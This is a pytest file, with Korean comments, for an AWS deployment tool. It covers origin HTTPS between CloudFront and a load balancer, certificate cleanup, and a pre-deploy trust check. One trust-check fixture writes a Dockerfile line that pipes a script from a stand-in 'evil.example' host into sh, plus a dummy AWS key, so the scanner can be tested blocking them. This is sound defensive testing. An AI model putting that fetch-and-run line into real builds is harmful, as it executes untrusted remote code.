"""2.0.35 — 제로 트러스트 층: CloudFront → 로드밸런서 구간 HTTPS(내 도메인) · 배포 전 신뢰 점검."""
from __future__ import annotations

import asyncio
import datetime
import json

import pytest

import aws_cleanup
from core import aws_cdn, aws_edge
from tests.aws_pattern_guard import PatternGuard

REGION = "ap-northeast-2"
NOSLEEP = lambda _s: None  # noqa: E731


@pytest.fixture(autouse=True)
def _isolated(tmp_path, monkeypatch):
    monkeypatch.setenv("RECODER_ECS_RUNTIME_DIR", str(tmp_path / "runtime-store"))
    monkeypatch.setenv("RECODER_HOME", str(tmp_path / "home"))


@pytest.fixture
def aws(monkeypatch):
    boto3 = pytest.importorskip("boto3")
    pytest.importorskip("moto")
    from moto import mock_aws
    for k in ("AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN", "AWS_PROFILE"):
        monkeypatch.delenv(k, raising=False)
    monkeypatch.setenv("AWS_ACCESS_KEY_ID", "testing")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "testing")
    with mock_aws():
        session = boto3.session.Session(region_name=REGION)
        clients = aws_cleanup.make_clients(session)
        clients["sts"] = session.client("sts")
        yield clients


def _req(**kw):
    from core.schemas import ECSDeployRequest
    base = dict(project_id="p1", cluster="recoder-cluster", service="recoder-shop", region=REGION,
                container_port=3000, health_check_path="/health", edge="alb", edge_cost_approved=True,
                https=True, custom_domain="shop.example.com")
    base.update(kw)
    return ECSDeployRequest(**base)


def _provision(aws, **kw):
    from core.agents.ecs_agent import ECSAgent
    from core.schemas import ECSDeployRecord
    agent = ECSAgent()
    req = _req(**kw)
    rec = ECSDeployRecord(project_id="p1", cluster=req.cluster, service=req.service, region=REGION)
    asyncio.run(agent._step_provision(req, rec, aws))
    return agent, req, rec


def _self_signed(domain: str) -> tuple[bytes, bytes]:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, domain)])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(name).issuer_name(name).public_key(key.public_key())
            .serial_number(x509.random_serial_number()).not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=30))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(domain)]), critical=False).sign(key, hashes.SHA256()))
    return cert.public_bytes(serialization.Encoding.PEM), key.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption())


def _issue(acm, domain: str) -> str:
    """발급된 인증서(moto 는 요청한 인증서를 발급하지 않는다 — 가져온 인증서는 ISSUED)."""
    body, key = _self_signed(domain)
    return acm.import_certificate(Certificate=body, PrivateKey=key)["CertificateArn"]


def _zone(aws) -> str:
    return aws["route53"].create_hosted_zone(Name="example.com", CallerReference="z")["HostedZone"]["Id"].rsplit("/", 1)[-1]


def _origin(aws, cdn_id: str) -> dict:
    return aws["cloudfront"].get_distribution_config(Id=cdn_id)["DistributionConfig"]["Origins"]["Items"][0]


# ── 원본 구간 HTTPS ─────────────────────────────────────────────────────────

def test_origin_https_waits_for_certificate_then_switches_cloudfront_to_https(aws):
    guard = PatternGuard().install()
    try:
        zone = _zone(aws)
        agent, req, rec = _provision(aws)
        edge, cdn = agent._edge[id(req)], agent._cdn[id(req)]
        # 첫 배포: 원본 인증서는 발급 대기 → CloudFront 는 지금처럼 ALB 주소·HTTP
        assert "준비 중" in rec.provisioned["origin_tls"]
        assert _origin(aws, cdn.distribution_id)["CustomOriginConfig"]["OriginProtocolPolicy"] == "http-only"
        assert aws_edge.https_listener(aws["elbv2"], edge.alb_arn) is None
        records = aws["route53"].list_resource_record_sets(HostedZoneId=zone)["ResourceRecordSets"]
        alias = next(r for r in records if r["Name"].rstrip(".") == "origin.shop.example.com" and r["Type"] == "A")
        assert alias["AliasTarget"]["DNSName"].rstrip(".").lower().endswith(edge.dns_name.lower())
        regional = aws["acm"].list_certificates()["CertificateSummaryList"]
        assert any(c["DomainName"] == "origin.shop.example.com" for c in regional), "원본 인증서는 배포 리전에"
        # 발급된 뒤 다시 배포: 443 리스너(같은 잠금) + CloudFront 원본을 origin.<도메인>·HTTPS 전용으로
        _issue(aws["acm"], "origin.shop.example.com")
        agent2, req2, rec2 = _provision(aws)
        edge2, cdn2 = agent2._edge[id(req2)], agent2._cdn[id(req2)]
        assert "켜짐" in rec2.provisioned["origin_tls"]
        origin = _origin(aws, cdn2.distribution_id)
        assert origin["DomainName"] == "origin.shop.example.com"
        assert origin["CustomOriginConfig"]["OriginProtocolPolicy"] == "https-only"
        https = aws_edge.https_listener(aws["elbv2"], edge2.alb_arn)
        assert https["Protocol"] == "HTTPS" and https["SslPolicy"] == aws_edge.SSL_POLICY
        sg = aws["ec2"].describe_security_groups(GroupIds=[edge2.alb_security_group])["SecurityGroups"][0]
        ports = {p["FromPort"] for p in sg["IpPermissions"] if p.get("PrefixListIds")}
        assert {80, 443} <= ports and not any(p.get("IpRanges") for p in sg["IpPermissions"]), "443 도 CloudFront 주소만"
        # 80 이 잠겨 있으면 443 도 같은 머리글 규칙 + 기본 403
        if rec2.provisioned.get("origin_lock", "").startswith("켜짐"):
            for listener in (edge2.listener_arn, https["ListenerArn"]):
                assert aws_edge.is_locked(aws["elbv2"], listener)
                assert aws_edge.origin_rule(aws["elbv2"], listener)
    finally:
        guard.uninstall()


def test_https_listener_copies_the_origin_lock_before_cloudfront_moves(aws):
    _zone(aws)
    agent, req, _rec = _provision(aws)
    edge = agent._edge[id(req)]
    aws_edge.lock_origin(aws["elbv2"], edge.listener_arn, edge.target_group_arn, "s3cret", also=["old"])
    cert = _issue(aws["acm"], "origin.shop.example.com")
    arn = aws_edge.ensure_https_listener(aws["elbv2"], alb_arn=edge.alb_arn, tg_arn=edge.target_group_arn,
                                         certificate_arn=cert, http_listener_arn=edge.listener_arn)
    assert aws_edge.is_locked(aws["elbv2"], arn)
    rule = aws_edge.origin_rule(aws["elbv2"], arn)
    values = rule["Conditions"][0]["HttpHeaderConfig"]["Values"]
    assert values == ["s3cret", "old"]
    # 두 번째 호출은 같은 리스너를 그대로 쓴다
    assert aws_edge.ensure_https_listener(aws["elbv2"], alb_arn=edge.alb_arn, tg_arn=edge.target_group_arn,
                                          certificate_arn=cert, http_listener_arn=edge.listener_arn) == arn


def test_origin_record_owned_by_someone_else_is_left_alone(aws):
    zone = _zone(aws)
    aws["route53"].change_resource_record_sets(HostedZoneId=zone, ChangeBatch={"Changes": [{"Action": "UPSERT",
        "ResourceRecordSet": {"Name": "origin.shop.example.com", "Type": "A", "TTL": 60,
                              "ResourceRecords": [{"Value": "203.0.113.10"}]}}]})
    _issue(aws["acm"], "origin.shop.example.com")
    agent, req, rec = _provision(aws)
    assert "꺼짐" in rec.provisioned["origin_tls"]
    assert any("203.0.113.10" in v for k, v in rec.provisioned.items() if k.startswith("domain_note_"))
    assert aws_edge.https_listener(aws["elbv2"], agent._edge[id(req)].alb_arn) is None
    record = aws["route53"].list_resource_record_sets(HostedZoneId=zone, StartRecordName="origin.shop.example.com",
                                                      StartRecordType="A", MaxItems="1")["ResourceRecordSets"][0]
    assert record["ResourceRecords"][0]["Value"] == "203.0.113.10"


def test_without_route53_zone_origin_stays_http_with_a_note(aws):
    agent, req, rec = _provision(aws)
    assert "꺼짐" in rec.provisioned["origin_tls"]
    assert any("Route 53 에 없어" in v for k, v in rec.provisioned.items() if k.startswith("domain_note_"))
    assert _origin(aws, agent._cdn[id(req)].distribution_id)["CustomOriginConfig"]["OriginProtocolPolicy"] == "http-only"


def test_https_without_custom_domain_keeps_the_existing_path(aws):
    agent, req, rec = _provision(aws, custom_domain="")
    assert "꺼짐" in rec.provisioned["origin_tls"]
    assert _origin(aws, agent._cdn[id(req)].distribution_id)["DomainName"] == agent._edge[id(req)].dns_name


def test_permission_failure_keeps_deploying_over_http(aws, monkeypatch):
    _zone(aws)
    _issue(aws["acm"], "origin.shop.example.com")
    from botocore.exceptions import ClientError
    monkeypatch.setattr(aws_edge, "ensure_https_listener", lambda *a, **k: (_ for _ in ()).throw(
        ClientError({"Error": {"Code": "AccessDenied", "Message": "no"}}, "CreateListener")))
    agent, req, rec = _provision(aws)
    assert "꺼짐" in rec.provisioned["origin_tls"]
    assert any("2.0.35 템플릿" in v for k, v in rec.provisioned.items() if k.startswith("domain_note_"))
    assert _origin(aws, agent._cdn[id(req)].distribution_id)["CustomOriginConfig"]["OriginProtocolPolicy"] == "http-only"


def test_cleanup_finds_the_origin_certificate_and_removes_its_record(aws):
    zone = _zone(aws)
    _issue(aws["acm"], "origin.shop.example.com")
    agent, req, _rec = _provision(aws)
    arn = next(c["CertificateArn"] for c in aws["acm"].list_certificates()["CertificateSummaryList"]
               if c["DomainName"] == "origin.shop.example.com")
    aws["acm"].add_tags_to_certificate(CertificateArn=arn, Tags=[{"Key": "recoder:managed", "Value": "true"},
                                                                 {"Key": "recoder:origin", "Value": "true"}])
    plan = aws_cleanup.plan(aws, region=REGION)
    items = [i for g in plan["groups"] for i in g["items"]]
    origin = [i for i in items if i["kind"] == "acm_origin_certificate"]
    assert origin and origin[0]["name"] == "origin.shop.example.com"
    assert not any(i["kind"] == "acm_certificate" and i["name"] == "origin.shop.example.com" for i in items)
    order = [i["kind"] for i in sorted(items, key=lambda i: aws_cleanup.ORDER.get(i["kind"], 99))]
    assert order.index("alb") < order.index("acm_origin_certificate")
    out = aws_cleanup.delete(aws, [origin[0]["id"]], region=REGION, approved=True, sleep=NOSLEEP)
    result = out["results"][0]
    if result.get("ok"):
        assert "레코드도 지웠습니다" in result["message"]
        names = [r["Name"].rstrip(".") for r in aws["route53"].list_resource_record_sets(HostedZoneId=zone)["ResourceRecordSets"]]
        assert "origin.shop.example.com" not in names
    else:  # 로드밸런서가 아직 쓰는 중이면 다음 정리로 미룬다
        assert result.get("skipped") and "로드밸런서" in result["message"]


def test_policy_allows_origin_certificates_only_in_us_east_1_and_the_deploy_region():
    from core import aws_policy as ap
    by = {s["Sid"]: s for s in ap.build_policy()["Statement"]}
    assert by["HttpsRequestCertificate"]["Condition"]["StringEquals"]["aws:RequestedRegion"] == ["<REGION>", "us-east-1"]
    assert sorted(by["HttpsCertificate"]["Resource"]) == [
        "arn:<PARTITION>:acm:<REGION>:<ACCOUNT_ID>:certificate/*", "arn:<PARTITION>:acm:us-east-1:<ACCOUNT_ID>:certificate/*"]
    assert "elasticloadbalancing:CreateListener" in by["EdgeLoadBalancer"]["Action"]
    template = json.loads(open(__import__("os").path.join(__import__("os").path.dirname(__file__), "..", "..", "infra",
                                                          "recoder-iam-quickcreate.json"), encoding="utf-8").read())
    assert "acm" in json.dumps(template)


# ── 배포 전 신뢰 점검 ───────────────────────────────────────────────────────

def _ws(tmp_path, files: dict) -> str:
    for rel, text in files.items():
        p = tmp_path / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text, encoding="utf-8")
    return str(tmp_path)


def _items(report) -> dict:
    return {i["key"]: i for p in report["principles"] for i in p["items"]}


SAFE_SERVER = ("import express from 'express';\nconst app = express();\n"
               "app.get('/health', (req, res) => res.json({ ok: true }));\napp.listen(process.env.PORT || 3000);\n")


def test_trust_check_groups_existing_checks_by_principle(tmp_path):
    import trust_check
    ws = _ws(tmp_path, {
        "package.json": json.dumps({"name": "shop", "dependencies": {"express": "^4.19.2"}}),
        "package-lock.json": "{}",
        "server.js": SAFE_SERVER,
        "Dockerfile": "FROM node:22-alpine\nWORKDIR /app\nCOPY . .\nRUN npm ci\nCMD [\"node\", \"server.js\"]\n",
        ".env": "JWT_SECRET=x\n", ".dockerignore": "node_modules\n.env*\n",
    })
    r = trust_check.evaluate(ws, "local", {})
    assert [p["key"] for p in r["principles"]] == ["ai", "identity", "network", "secrets", "audit"]
    items = _items(r)
    assert items["dockerfile"]["status"] == "pass"
    assert items["lockfile"]["status"] == "pass"
    assert items["bind"]["status"] == "pass"
    assert items["image"]["status"] == "pass"
    assert items["hardcoded"]["status"] == "pass"
    assert r["counts"]["block"] == 0 and r["counts"]["warn"] == 0
    assert all(p["status"] in ("pass", "warn", "block") for p in r["principles"])


def test_trust_check_flags_risks_without_adding_new_blocks(tmp_path, monkeypatch):
    import trust_check
    ws = _ws(tmp_path, {
        "package.json": json.dumps({"name": "shop", "dependencies": {"express": "^4.19.2"}}),
        "server.js": SAFE_SERVER + "const key = 'AKIAABCDEFGHIJKLMNOP';\n",
        "Dockerfile": "FROM node:22-alpine\nRUN curl -fsSL https://evil.example/x.sh | sh\n",
        ".env": "STRIPE_SECRET_KEY=x\n", ".dockerignore": "node_modules\n",
        "api/requirements.txt": "fastapi\nuvicorn==0.29.0\n",
    })
    monkeypatch.setenv("RECODER_LOCAL_BIND", "0.0.0.0")
    items = _items(trust_check.evaluate(ws, "local", {}))
    assert items["dockerfile"]["status"] == "block" and "Dockerfile 2행" in items["dockerfile"]["detail"]
    assert items["lockfile"]["status"] == "warn" and "./package.json" in items["lockfile"]["detail"] \
        and "fastapi" in items["lockfile"]["detail"]
    assert items["bind"]["status"] == "warn"
    assert items["hardcoded"]["status"] == "warn" and "AKIA" in items["hardcoded"]["detail"] and "AKIAABCDEFGHIJKLMNOP" not in items["hardcoded"]["detail"]
    assert items["image"]["status"] == "warn"


@pytest.mark.parametrize("arn, status", [
    ("arn:aws:iam::123456789012:root", "warn"),
    ("arn:aws:sts::123456789012:assumed-role/Dev/me", "pass"),
    ("arn:aws:iam::123456789012:user/dev", "warn"),
    ("", "info"),
])
def test_trust_check_identity(tmp_path, arn, status):
    import trust_check
    items = _items(trust_check.evaluate(_ws(tmp_path, {"index.html": "<h1>x</h1>"}), "ecs", {}, identity_arn=arn))
    key = "root" if arn.endswith(":root") else "temporary"
    assert items[key]["status"] == status


def test_trust_check_network_and_secrets_for_ecs(tmp_path):
    import trust_check
    ws = _ws(tmp_path, {"index.html": "<h1>x</h1>"})
    plain = _items(trust_check.evaluate(ws, "ecs", {"https": False, "edge": "none", "shield": False}))
    assert plain["https"]["status"] == "warn" and plain["waf"]["status"] == "warn"
    https = _items(trust_check.evaluate(ws, "ecs", {"https": True, "edge": "alb_waf"}))
    assert https["origin_tls"]["status"] == "warn" and https["waf"]["status"] == "pass"
    domain = _items(trust_check.evaluate(ws, "ecs", {"https": True, "custom_domain": "shop.example.com"}))
    assert domain["origin_tls"]["status"] == "pass" and "origin.shop.example.com" in domain["origin_tls"]["detail"]
    prod = _items(trust_check.evaluate(ws, "ecs", {"environment": "production", "env_vars": {"JWT_SECRET": ""}, "alerts": False}))
    assert prod["runtime"]["status"] == "warn" and prod["watch"]["status"] == "warn"
    refs = _items(trust_check.evaluate(ws, "ecs", {"environment": "production", "secret_refs": {"JWT_SECRET": ""}}))
    assert refs["runtime"]["status"] == "pass"
    s3 = _items(trust_check.evaluate(ws, "s3", {}))
    assert s3["s3_http"]["status"] == "warn" and s3["upload"]["status"] == "pass" and "dockerfile" not in s3


def test_trust_check_is_bounded_on_huge_folders(tmp_path):
    import time
    import trust_check
    for i in range(1500):
        (tmp_path / f"f{i}.js").write_text("export const x = 1;\n", encoding="utf-8")
    (tmp_path / "node_modules" / "big").mkdir(parents=True)
    (tmp_path / "node_modules" / "big" / "index.js").write_text("const k='AKIAABCDEFGHIJKLMNOP'", encoding="utf-8")
    started = time.time()
    r = trust_check.evaluate(str(tmp_path), "local", {})
    assert time.time() - started < 20
    assert r["truncated"] and r["scanned_files"] == trust_check.MAX_FILES and "note" in r
    assert _items(r)["hardcoded"]["status"] == "pass", "node_modules 는 보지 않는다"


def test_trust_check_endpoint_never_echoes_values(tmp_path):
    from fastapi import FastAPI
    from fastapi.testclient import TestClient
    from api.routes import deploy
    app = FastAPI()
    app.include_router(deploy.router)
    client = TestClient(app)
    ws = _ws(tmp_path, {"index.html": "<h1>x</h1>"})
    resp = client.post("/api/deploy/trust-check", json={
        "workspace_path": ws, "target": "ecs", "identity_arn": "arn:aws:iam::123456789012:user/dev",
        "config": {"https": True, "environment": "production", "env_vars": {"JWT_SECRET": "super-secret-value"},
                   "unknown": {"nested": 1}}})
    assert resp.status_code == 200, resp.text
    body = resp.text
    assert "super-secret-value" not in body
    assert "JWT_SECRET" in body
    assert client.post("/api/deploy/trust-check", json={"workspace_path": str(tmp_path / "nope"), "target": "local"}).status_code == 400
    assert client.post("/api/deploy/trust-check", json={"workspace_path": ws, "target": "mars"}).status_code == 422
